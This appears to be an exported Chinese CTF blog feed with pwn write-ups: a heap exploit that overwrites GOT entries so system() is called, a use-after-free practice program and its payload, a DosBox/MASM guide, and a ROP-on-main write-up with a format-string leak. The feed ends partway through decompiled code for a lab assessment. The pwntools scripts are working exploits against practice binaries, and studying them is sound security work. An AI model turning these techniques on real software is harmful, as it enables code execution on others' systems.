<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/shiroha/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh, command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">command</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;idx:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx, size, content</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    index(idx)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">if</span> content != <span class="string">&quot;&quot;</span>:</span><br><span class="line">        sh.sendafter(<span class="string">&quot;content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    index(idx)</span><br><span class="line">    sh.sendafter(<span class="string">&quot;content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line">put_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">put_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x80</span>, <span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&quot;a&quot;</span> * <span class="number">0x18</span> + p64(<span class="number">0xfe1</span>))</span><br><span class="line">[add(<span class="number">0</span>, <span class="number">0x80</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x80</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1a</span>)]</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x8</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x71</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x90</span>, <span class="string">&#x27;%17$p&#x27;</span>.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x01&#x27;</span>))</span><br><span class="line"></span><br><span class="line">memset_addr = elf.got[<span class="string">&#x27;memset&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(<span class="number">0x6021c0</span>))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>, <span class="string">&#x27;%17$p&#x27;</span>.ljust(<span class="number">0x60</span>, <span class="string">&#x27;\x01&#x27;</span>))</span><br><span class="line">edit(<span class="number">0</span>, p64(memset_addr))</span><br><span class="line">edit(<span class="number">1</span>, p64(printf_plt))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x90</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;\x30&#x27;</span>)</span><br><span class="line">c = <span class="built_in">int</span>(<span class="string">&#x27;\x30&#x27;</span> + sh.recvuntil(<span class="string">&#x27;\x01&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">print(<span class="string">&quot;c ==&gt; &quot;</span> + <span class="built_in">hex</span>(c))</span><br><span class="line">base = c - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>] - <span class="number">240</span></span><br><span class="line">print(<span class="string">&quot;base ==&gt; &quot;</span> + <span class="built_in">hex</span>(base))</span><br><span class="line"></span><br><span class="line">system = base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x90</span>)</span><br><span class="line"><span class="comment"># one = [0x45226, 0x4527a, 0xf0364]</span></span><br><span class="line">edit(<span class="number">0</span>, p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]))</span><br><span class="line">edit(<span class="number">1</span>, p64(system))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
        <category>heap</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>一个堆溢出的小例子</title>
    <url>//an_example.html</url>
    <content><![CDATA[<ul>
<li>让程序中，有两个指标指向同一个chunk<ul>
<li>一块是<strong>structure</strong>，另一块是用作<strong>data buffer</strong></li>
<li>利用对<strong>buffer</strong>的读写，泄露或者修改<strong>structure</strong>的内容</li>
</ul>
</li>
</ul>
<a id="more"></a>

<h3 id="练习程序"><a href="#练习程序" class="headerlink" title="练习程序"></a>练习程序</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;class A&quot;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span> <span class="keyword">public</span> A&#123;</span><br><span class="line"><span class="keyword">public</span> :</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;class B&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1233\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sh</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pause</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">//setbuf(stdin,0);</span></span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	A *p = <span class="keyword">new</span> B();</span><br><span class="line">	<span class="keyword">delete</span> p;</span><br><span class="line">	add();</span><br><span class="line">	fgets(buf, <span class="keyword">sizeof</span>(buf), <span class="built_in">stdin</span>);</span><br><span class="line">	pause();</span><br><span class="line">	add();</span><br><span class="line">	<span class="keyword">char</span> *q = strdup(buf);</span><br><span class="line">	p-&gt;print();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><em>说明:其中的<strong>add()**函数，是我用来改变</strong>sh()<strong>的地址的,(本来是0a结尾，会被截断)，</strong>pause()**是调试的时候用来下断点的，setvbuf(stdin,0,2,0)是必须的，不然fgets会拿走fastbin</em></p>
<p>在CPP中，new对象的时候会创建一个堆块，里面放入参数和函数的地址，这里delete p之后并没有让p指向null，所以p指针还有值，可以被调用，<code>q = srtdup(buf)</code>可以拿到q对应的堆块，<strong>改写其中的指针，使其指向buf + 8 ，然后让buf + 8指向sh()**，就可以调用</strong>sh()**函数</p>
<p>payload如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./UAF&quot;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(sh,<span class="string">&quot;&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;1233&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x601160</span> + <span class="number">8</span>) + p64(<span class="number">0x40091b</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>pwn</category>
        <category>heap</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>DosBox 的使用方法</title>
    <url>//DosBox.html</url>
    <content><![CDATA[<p>Windows下<code>DosBox</code>的使用方法</p>
<a id="more"></a>

<h1 id="DosBox-使用方法"><a href="#DosBox-使用方法" class="headerlink" title="DosBox 使用方法"></a>DosBox 使用方法</h1><h2 id="常用程序"><a href="#常用程序" class="headerlink" title="常用程序"></a>常用程序</h2><ul>
<li>masm</li>
<li>link</li>
<li>debug</li>
</ul>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ul>
<li>挂载盘符<ul>
<li>使用命令 <code>mount desk location</code>,其中desk 是虚拟盘符命，可以自己命名，location可以是一个盘( C D E)，也可以是一个文件夹<ul>
<li>例如我想挂载的路径为 <code>E:\asm\dosbox-0.74\tools</code>，并命名为X盘，则输入命令<code>mount x E:\asm\dosbox-0.74\tools</code>，这个时候就把X盘（虚构的）绑定到了这个目录下面，然后输入<code>x:</code>进入该目录，如下图所示</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><a href="http://49.234.181.139/wp-content/uploads/2019/12/1.png"><img src="http://49.234.181.139/wp-content/uploads/2019/12/1-300x59.png"></a></p>
<ul>
<li>这里推荐把盘符挂载到<strong>masm.exe</strong>所在的目录，为了以后使用方便</li>
</ul>
<h2 id="masm-exe"><a href="#masm-exe" class="headerlink" title="masm.exe"></a>masm.exe</h2><p>是编译程序，用来编译汇编文件，编译完成之后会产生一个<code>.obj</code>文件</p>
<p>输入命令<code>masm *.asm</code>,这里的*是指你的文件名称，例如<code>masm 2.asm</code>，如果你的程序没有错误的话，那么就会变成这样</p>
<p><a href="http://49.234.181.139/wp-content/uploads/2019/12/2.png"><img src="http://49.234.181.139/wp-content/uploads/2019/12/2-300x52.png"></a></p>
<p>要求输入的是obj文件的名字，如果想和asm文件的名称一样就直接回车跳过，或者使用<code>masm 2.asm;</code>，即加入一个 <code>;</code>，<br><a href="http://49.234.181.139/wp-content/uploads/2019/12/4.png"><img src="http://49.234.181.139/wp-content/uploads/2019/12/4-300x161.png"></a></p>
<p>两种方法结果如图所示</p>
<h2 id="link-exe"><a href="#link-exe" class="headerlink" title="link.exe"></a>link.exe</h2><p>link是用来将obj文件链接成exe文件的工具，运行完之后，如果没有错误，会产生一个exe文件</p>
<p><code>link *.obj</code> 这个* 也是文件名的样子，运行结果如下</p>
<p><a href="http://49.234.181.139/wp-content/uploads/2019/12/3.png"><img src="http://49.234.181.139/wp-content/uploads/2019/12/3-300x195.png"></a></p>
<p>也是可以加入<code>;</code>的</p>
<p>链接完之后产生的exe就是可执行文件了，输入<code>*.exe</code>可以直接运行</p>
<h2 id="debug-exe"><a href="#debug-exe" class="headerlink" title="debug.exe"></a>debug.exe</h2><p>debug.exe是调试用的工具，</p>
<p><code>debug [filename]</code> filename是一个可选参数，如果不给出的话，就会进入一般的debug界面(与windows XP的debug一样)，如果给出filename 则会调试这个程序</p>
<p>例如 <code>debug 2.exe</code></p>
<p><a href="http://49.234.181.139/wp-content/uploads/2019/12/5.png"><img src="http://49.234.181.139/wp-content/uploads/2019/12/5.png"></a></p>
<p>然后就可以使用debug的命令去调试</p>
<h3 id="debug命令"><a href="#debug命令" class="headerlink" title="debug命令"></a>debug命令</h3><p><a href="https://jingyan.baidu.com/article/a65957f433f60924e67f9b07.html">百度经验</a> </p>
<p><a href="%5Bhttps://baike.baidu.com/item/debug%E5%91%BD%E4%BB%A4/10080524?fr=aladdin%5D(https://baike.baidu.com/item/debug%E5%91%BD%E4%BB%A4/10080524?fr=aladdin)">百度百科</a></p>
<h1 id="FIN"><a href="#FIN" class="headerlink" title="FIN"></a>FIN</h1><h2 id="ps-有啥不懂的问WXR就完事了"><a href="#ps-有啥不懂的问WXR就完事了" class="headerlink" title="ps:有啥不懂的问WXR就完事了"></a>ps:有啥不懂的问WXR就完事了</h2>]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>dosbox</tag>
      </tags>
  </entry>
  <entry>
    <title>main函数的ROP问题</title>
    <url>//main_rop.html</url>
    <content><![CDATA[<p>示例：安恒7月月赛签到题</p>
<p><strong>本文主要探讨的是main函数的ROP问题，不是题解（</strong></p>
<a id="more"></a>



<h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><p>伪C代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;what&#x27;s your name:&quot;</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nCan you solve this sign-in problem?&quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对应的汇编代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:08048595 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:08048595                 public main</span><br><span class="line">.text:08048595 main            proc near               ; DATA XREF: _start+17↑o</span><br><span class="line">.text:08048595</span><br><span class="line">.text:08048595 var_28          &#x3D; byte ptr -28h</span><br><span class="line">.text:08048595 s               &#x3D; byte ptr -18h</span><br><span class="line">.text:08048595 var_4           &#x3D; dword ptr -4</span><br><span class="line">.text:08048595 argc            &#x3D; dword ptr  8</span><br><span class="line">.text:08048595 argv            &#x3D; dword ptr  0Ch</span><br><span class="line">.text:08048595 envp            &#x3D; dword ptr  10h</span><br><span class="line">.text:08048595</span><br><span class="line">.text:08048595 ; __unwind &#123;</span><br><span class="line">.text:08048595                 lea     ecx, [esp+4]</span><br><span class="line">.text:08048599                 and     esp, 0FFFFFFF0h</span><br><span class="line">.text:0804859C                 push    dword ptr [ecx-4]</span><br><span class="line">.text:0804859F                 push    ebp</span><br><span class="line">.text:080485A0                 mov     ebp, esp</span><br><span class="line">.text:080485A2                 push    ecx</span><br><span class="line">.text:080485A3                 sub     esp, 24h</span><br><span class="line">.text:080485A6                 call    init</span><br><span class="line">.text:080485AB                 sub     esp, 0Ch</span><br><span class="line">.text:080485AE                 push    offset s        ; &quot;what&#39;s your name:&quot;</span><br><span class="line">.text:080485B3                 call    _puts</span><br><span class="line">.text:080485B8                 add     esp, 10h</span><br><span class="line">.text:080485BB                 sub     esp, 0Ch</span><br><span class="line">.text:080485BE                 lea     eax, [ebp+s]</span><br><span class="line">.text:080485C1                 push    eax             ; s</span><br><span class="line">.text:080485C2                 call    _gets</span><br><span class="line">.text:080485C7                 add     esp, 10h</span><br><span class="line">.text:080485CA                 sub     esp, 0Ch</span><br><span class="line">.text:080485CD                 lea     eax, [ebp+s]</span><br><span class="line">.text:080485D0                 push    eax             ; format</span><br><span class="line">.text:080485D1                 call    _printf</span><br><span class="line">.text:080485D6                 add     esp, 10h</span><br><span class="line">.text:080485D9                 sub     esp, 0Ch</span><br><span class="line">.text:080485DC                 push    offset aCanYouSolveThi ; &quot;\nCan you solve this sign-in problem?&quot;</span><br><span class="line">.text:080485E1                 call    _puts</span><br><span class="line">.text:080485E6                 add     esp, 10h</span><br><span class="line">.text:080485E9                 sub     esp, 0Ch</span><br><span class="line">.text:080485EC                 lea     eax, [ebp+var_28]</span><br><span class="line">.text:080485EF                 push    eax             ; s</span><br><span class="line">.text:080485F0                 call    _gets</span><br><span class="line">.text:080485F5                 add     esp, 10h</span><br><span class="line">.text:080485F8                 mov     eax, 0</span><br><span class="line">.text:080485FD                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:08048600                 leave</span><br><span class="line">.text:08048601                 lea     esp, [ecx-4]</span><br><span class="line">.text:08048604                 retn</span><br><span class="line">.text:08048604 ; &#125; &#x2F;&#x2F; starts at 8048595</span><br></pre></td></tr></table></figure>



<p>漏洞点很明显存在<strong>格式化字符串以及栈溢出</strong></p>
<h2 id="main函数的开头结尾"><a href="#main函数的开头结尾" class="headerlink" title="main函数的开头结尾"></a>main函数的开头结尾</h2><p>对于main函数的ROP相比于其他函数有很大的不一样，最重要的地方就是最前和最后那几条语句</p>
<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><h4 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lea ecx, [esp+4]</span><br><span class="line">and esp, 0xfffffff0</span><br><span class="line">push [ecx-4]</span><br><span class="line">push ebp</span><br><span class="line">mov ebp, esp</span><br><span class="line">push ecx</span><br></pre></td></tr></table></figure>

<h4 id="对应的栈帧"><a href="#对应的栈帧" class="headerlink" title="对应的栈帧"></a>对应的栈帧</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------------------+		; &lt;---- esp</span><br><span class="line">|         ecx         |</span><br><span class="line">+---------------------+		; &lt;---- ebp</span><br><span class="line">|         ebp         |</span><br><span class="line">+---------------------+</span><br><span class="line">|       [ecx-4]       |		; [ecx - 4] &#x3D;&#x3D; [ret]</span><br><span class="line">+---------------------+</span><br><span class="line">|         ...         |</span><br><span class="line">+---------------------+</span><br><span class="line">|         ret         |</span><br><span class="line">+---------------------+		; &lt;---- ecx</span><br></pre></td></tr></table></figure>

<h4 id="解释："><a href="#解释：" class="headerlink" title="解释："></a>解释：</h4><p>由于在<code>call main</code>的时候，<code>esp</code>指向的就是<code>main的ret</code>也就是<code>__libc_start_main+offset</code>的位置，然后<code>lea ecx, [esp-4]</code>使得<code>ecx</code>指向了<code>ret</code>之后的一个地址。然后经过<code>and esp, 0xfffffff0</code>之后，<code>esp</code>向上变化了一定的空间，又通过<code>push ecx</code>起到了保存的作用</p>
<h3 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h3><h4 id="汇编-1"><a href="#汇编-1" class="headerlink" title="汇编"></a>汇编</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ecx, [ebp+var_4]</span><br><span class="line">leave</span><br><span class="line">lea esp, [ecx-4]</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>

<h4 id="对应的栈帧-1"><a href="#对应的栈帧-1" class="headerlink" title="对应的栈帧"></a>对应的栈帧</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------------------+		; &lt;---- ebp+var_4</span><br><span class="line">|         ecx         |</span><br><span class="line">+---------------------+		; &lt;---- ebp</span><br><span class="line">|         ebp         |</span><br><span class="line">+---------------------+</span><br><span class="line">|       [ecx-4]       |		</span><br><span class="line">+---------------------+</span><br><span class="line">|         ...         |</span><br><span class="line">+---------------------+		</span><br><span class="line">|         ret         |</span><br><span class="line">+---------------------+		; &lt;---- ecx(stack)</span><br></pre></td></tr></table></figure>

<h4 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h4><p>main函数返回的时候，会先把<code>ebp-4</code>里面保存的<code>原ecx</code>寄存器的值还原，然后根据这个<code>ecx</code>的值，找到真正的<code>ret</code></p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>因为ROP需要劫持返回地址，那么在不知道原<code>ecx</code>值的情况下是无法真正劫持<code>ret</code>的，所以给了一个格式化字符串泄漏栈内的值，在泄漏了值之后就变得简单了</p>
<h3 id="附上exp"><a href="#附上exp" class="headerlink" title="附上exp"></a>附上exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./qiandao&quot;</span>)</span><br><span class="line"><span class="comment">#sh = remote(&quot;183.129.189.60&quot;, 10013)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh, command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x804857D</span></span><br><span class="line"></span><br><span class="line">junk = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x24</span>)</span><br><span class="line"></span><br><span class="line">formats = <span class="string">&quot;%13$p&quot;</span></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;name:&quot;</span>, formats)</span><br><span class="line">sh.recvline()</span><br><span class="line">bp = <span class="built_in">int</span>(sh.recvline()[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">cx = bp - <span class="number">0x18</span> + <span class="number">0x4</span></span><br><span class="line">print(<span class="string">&quot;bp ==&gt; &quot;</span> + <span class="built_in">hex</span>(bp))</span><br><span class="line"></span><br><span class="line">dbg(<span class="string">&quot;b *0x080485FD&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = junk + p32(cx) + p32(backdoor) + p32(cx - <span class="number">8</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;problem&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
        <category>ROP</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ROP</tag>
      </tags>
  </entry>
  <entry>
    <title>极光实验室二进制组考核</title>
    <url>//aurora_bin_test.html</url>
    <content><![CDATA[<p>极光实验室二进制组考核pwn题wp</p>
<a id="more"></a>



<h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = setbufs(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    v3 = get_int();</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">delete</span>(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        edit(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Wrong choice!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">add</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> nbytes; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> nbytes_4; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which size you want to add?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. small&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. big&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. large&quot;</span>);</span><br><span class="line">  v1 = get_int(<span class="string">&quot;3. large&quot;</span>);</span><br><span class="line">  nbytes_4 = v1;</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    nbytes = <span class="number">104</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v1 == <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    nbytes = <span class="number">1024</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong size!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nbytes = <span class="number">56</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)(<span class="number">8L</span>L * (v1 - <span class="number">1</span>) + a1) = <span class="built_in">malloc</span>(nbytes);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your info?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, *(<span class="keyword">void</span> **)(<span class="number">8L</span>L * (nbytes_4 - <span class="number">1</span>) + a1), (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">  *(_QWORD *)(<span class="number">8L</span>L * nbytes - <span class="number">8</span> + a1) = <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your info:&quot;</span>);</span><br><span class="line">  write(<span class="number">1</span>, *(<span class="keyword">const</span> <span class="keyword">void</span> **)(<span class="number">8L</span>L * (nbytes_4 - <span class="number">1</span>) + a1), (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Add successfully!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
